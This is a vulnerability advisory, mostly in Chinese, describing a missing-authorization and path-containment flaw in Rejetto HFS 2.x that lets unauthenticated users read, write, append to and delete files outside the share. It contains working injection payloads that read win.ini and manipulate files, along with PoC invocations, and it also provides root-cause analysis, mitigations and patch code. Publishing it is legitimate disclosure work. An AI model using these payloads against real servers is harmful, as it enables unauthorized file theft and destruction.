# Advisory: HFS 2.x 模板文件宏鉴权缺失 — 未授权任意文件读/写/删

| Item | Value |
|---|---|
| **Advisory ID** | WGETNZ-HFS2-2026-002 |
| **Product** | Rejetto HTTP File Server (HFS) 2.x |
| **Affected** | 2.4.0 RC7（build 319，实测）；2.4 全系列及 `master` 的 2.4.0 RC8 源码 |
| **Vulnerability** | 授权缺失导致任意文件读取 / 写入 / 追加 / 删除（共享目录之外） |
| **CWE** | CWE-862（次：CWE-22） |
| **CVSS v3.1** | 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CVSS v4.0** | 9.3 Critical — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| **Status** | 已向 CNA 申请 CVE 编号 |
| **Author** | [@wgetnz](https://github.com/wgetnz) |

> 本 advisory 与 [WGETNZ-HFS2-2026-001](../hfs2-upload-filename-template-injection/README.md) 记录的是**同一产品上两处相互独立的缺陷**。001 是模板注入（入口点问题），本 002 是宏分发器**没有鉴权模型**（控制缺失）。二者根因与修复位置均不同：封堵任何一个注入向量**都不会**消除本控制缺失，它可从未来任何模板注入路径再次触达。

---

## 1. Summary (English)

Rejetto HTTP File Server (HFS) 2.4.0 RC7 implements privileged file operations as template macros — `{.load.}`, `{.save.}`, `{.append.}`, `{.delete.}`, `{.filesize.}`, `{.exists.}`, `{.mkdir.}` and related — and dispatches them **without any authorization check on the caller**. In addition, the path resolver `uri2diskMaybe()` returns its argument **verbatim** whenever the path contains no forward slash, so an absolute Windows path such as `C:\Windows\win.ini` is never mapped into, or checked against, the shared folder — it bypasses the virtual-file-system containment entirely. Any template-evaluation primitive therefore escalates to arbitrary filesystem access outside the share: an unauthenticated attacker can read, create, append to and delete any file the HFS service account can reach. Verified on 2.4.0 RC7 build 319: `C:\Windows\win.ini` was read in full, and a canary file outside the share was created, read back, appended to and deleted.

---

## 2. 漏洞概述（中文）

HFS 2.4.0 RC7 把特权文件操作实现为模板宏（`{.load.}`、`{.save.}`、`{.append.}`、`{.delete.}`、`{.filesize.}`、`{.exists.}`、`{.mkdir.}` 等），但在分发时**不对调用者做任何鉴权**。同时路径解析函数 `uri2diskMaybe()` 在路径不含正斜杠时把参数**原样返回**，因此 `C:\Windows\win.ini` 这类绝对路径完全绕过虚拟文件系统的包含关系，不会被解析进共享目录。两者叠加：任何模板求值原语都可升级为共享目录之外的任意文件系统访问——未认证攻击者可读取、创建、追加、删除 HFS 服务账号可达的任意文件。

---

## 3. 技术分析

### 3.1 数据流 / 触发路径

```
模板求值原语
  → {.load|C:\Windows\win.ini|var=z.} / {.save|...|} / {.append|...|} / {.delete|...}
  → scriptLib.pas 分发：  if name = 'load'   then load(p, par(1,'var'));
                          if (name = 'save') or (name = 'append') then save();
                          if name = 'delete' then <删除分支>
        （这些分支全程不检查 md.cd.account，无任何鉴权判定）
  → load()  : s := loadFile(uri2diskMaybe(fn), from, size)
    save()  : saveTextFile(uri2diskMaybeFolder(p), s, name = 'append')
    delete  : s := uri2diskMaybe(p, NIL, FALSE);  moveToBin(s) / deltree(s)
  → utillib.pas uri2diskMaybe()：
        if ansiContainsStr(path, '/') then result:=uri2disk(path, parent, resolveLnk)
        else result:=path;                     ← 绝对路径被「原样」返回
  → 操作系统文件 API 作用于攻击者指定的绝对路径，完全在共享目录之外
```

### 3.2 代码定位

`scriptLib.pas` —— 特权分支无任何门槛即被分发：

```pascal
if name = 'load' then
  load(p, par(1,'var'));

if (name = 'save') or (name = 'append') then
  save();

if name = 'delete' then
  ...  s:=uri2diskMaybe(p,NIL,FALSE);  moveToBin(s) / deltree(s) ...
```

`utillib.pas` —— 路径解析函数的「原样返回」分支正是击穿 VFS 包含关系的环节：

```pascal
function uri2diskMaybe(path:string; parent:Tfile=NIL; resolveLnk:boolean=TRUE):string;
begin
if ansiContainsStr(path, '/') then
  result:=uri2disk(path, parent, resolveLnk)
else
  result:=path;          // ← 绝对 Windows 路径被原样返回，未经共享目录映射
end;
```

`scriptLib.pas` —— 被当作守卫使用的函数只判断指针非空，无法表达鉴权决策：

```pascal
function satisfied(p:pointer):boolean;
begin
result:=assigned(p);
unsatisfied(not result);
end;
```

### 3.3 根因

宏分发器**没有鉴权模型**。转义与路径收敛在汇点处双双缺失：文件分支拿到什么路径就作用于什么路径，从不查询调用者身份或能力；解析函数的「原样返回」分支意味着绝对路径从不被映射进共享目录、也不与之做包含性校验。攻击者与任意文件系统访问之间只剩「是否存在某个模板求值原语」这一个变量。

---

## 4. 复现

**测试环境**：HFS 2.4.0 RC7 build 319（上游原版发行二进制）/ Windows 10 x64 / 默认配置 / 非特权账号运行。共享目录之外的所有路径均为测试专用。

> 投递宏需要一个模板求值原语。本次用的是上传文件名模板注入（[WGETNZ-HFS2-2026-001](../hfs2-upload-filename-template-injection/README.md)），此处仅作为传输通道。注意上传处理器会剥离 multipart filename 中的字面反斜杠与冒号，因此路径在求值时用 `{.chr|92.}`（`\`）与 `{.chr|58.}`（`:`）合成。

### 4.1 共享目录之外的文件系统 oracle

```
{.exists|C{.chr|58.}{.chr|92.}Windows{.chr|92.}win.ini.}    → 1
{.filesize|C{.chr|58.}{.chr|92.}Windows{.chr|92.}win.ini.}  → 92
```

### 4.2 任意文件读取（只读，核心证明）

```
filename="%item-resource%:}{.load|C{.chr|58.}{.chr|92.}Windows{.chr|92.}win.ini|var=z.}{.^z.}"
```
```
HTTP/1.1 200 OK

[{ "err":"Not allowed.", "name":"\%item-resource%; for 16-bit app support\r\n[fonts]\r\n[extensions]\r\n[mci extensions]\r\n[files]\r\n[Mail]\r\nMAPI=1\r\n&amp;#58;}; for 16-bit app support\r\n[fonts]\r\n[extensions]\r\n[mci extensions]\r\n[files]\r\n[Mail]\r\nMAPI=1\r\n" }
]
```

`C:\Windows\win.ini` 的**完整内容**被返回给未认证请求方——该文件位于共享目录之外，也不属于任何虚拟文件系统节点。

### 4.3 任意文件写入 / 追加 / 删除（canary 自清理）

仅使用系统临时目录中明确命名的 canary，未触碰共享目录内任何文件：

| 子步骤 | 宏 | 观察结果 |
|---|---|---|
| 创建 | `{.save\|<canary>\|OUTSIDE_SHARE_<epoch>.}` | 无报错 |
| 读回 | `{.load\|<canary>\|var=z.}{.^z.}` | 返回 `OUTSIDE_SHARE_<epoch>}`，与写入内容一致 |
| 追加 | `{.append\|<canary>\|_APPENDED.}` | 无报错 |
| 删除 | `{.delete\|<canary>.}` | 无报错 |
| 确认已删 | `{.exists\|<canary>.}` | 返回空（文件已不存在） |

测试结束后另在文件系统侧带外确认无 canary 残留。

### 4.4 PoC 使用

```bash
# 读取共享目录外的文件（只读，默认行为）
USE_BURP=0 python3 poc/verify_hfs2_macro_fileops.py --target http://<TARGET>:8090 --read 'C:\Windows\win.ini'

# 额外验证写入 + 删除（canary 自清理，需显式开启）
USE_BURP=0 python3 poc/verify_hfs2_macro_fileops.py --target http://<TARGET>:8090 --write-demo
```

**默认只读**；写入/追加/删除仅在 `--write-demo` 时执行，并在结束后删除 canary。脚本不含反弹 shell、持久化或横向移动逻辑。

---

## 5. 修复建议

### 5.1 临时缓解

- 不要将 HFS 2.x 暴露于不可信网络；将监听限制在可信内网或 VPN。
- 以最小权限账号运行 HFS，并把该账号的文件系统权限限制在共享目录内，使共享目录之外的访问由操作系统而非应用层来限制。
- 若模板不需要 `{.save.}` / `{.delete.}`，直接删除相应段（本攻击只要求存在模板求值原语）。
- 迁移到 HFS 3.x（厂商唯一在维护的分支）。

### 5.2 根治

**① 为每个特权宏分支补上真实的鉴权门槛**，以调用者能力为判据，而不是判断指针非空——复用产品中已有的文件能力判定（`accountAllowed()` / `Tfile.accessFor()`）：

```pascal
// scriptLib.pas
if name = 'load' then
  if accountAllowed(FA_ACCESS, md.cd.account) then load(p, par(1,'var'))
  else unsatisfied;

if (name = 'save') or (name = 'append') then
  if accountAllowed(FA_UPLOAD, md.cd.account) then save()
  else unsatisfied;

if name = 'delete' then
  if accountAllowed(FA_DELETE, md.cd.account) then ... 删除分支 ...
  else unsatisfied;
```

**② 在汇点处对路径做收敛与规范化**——拒绝绝对路径与穿越、规范化解析、操作前校验包含关系：

```pascal
// utillib.pas, uri2diskMaybe()
-else
-  result:=path;
+else
+  begin
+  result:=expandFileName(path);
+  if not isSubPath(result, getShareRoot()) then
+    result:='';            // 失败即关闭：拒绝共享树之外的路径
+  end;
```

任何穿越检查都应把正斜杠视作分隔符（现有 `onlyDotsRE` 正则只识别反斜杠），并对 `mkdir`、`chdir`、`rename`、`move`、`copy`、`filesize`、`md5 file`、`filetime`、`disk free` 施加同样的收敛——它们都经由同一组辅助函数解析路径。

### 5.3 修复验证

共享目录之外路径既不应返回文件内容、也不应返回文件大小；存在性 oracle 应报文件不存在，读取宏应返回空。同时共享目录内的读取必须保持正常。`poc/verify_hfs2_macro_fileops.py` 可直接作为回归测试。

---

## 6. 披露时间线

| 日期 | 事项 |
|---|---|
| 2026-09-16 | 在 HFS 2.4.0 RC7 build 319 上发现并验证（读取 3/3；写入→读回→删除往返 2/2） |
| 2026-09-16 | 向 CNA 提交 CVE 申请 |
| — | CVE 编号分配后更新此行 |

## 7. References

- 产品源码：https://github.com/rejetto/hfs2
- 姊妹 advisory（同一产品上另一处独立缺陷）：[`advisories/hfs2-upload-filename-template-injection`](../hfs2-upload-filename-template-injection/README.md)
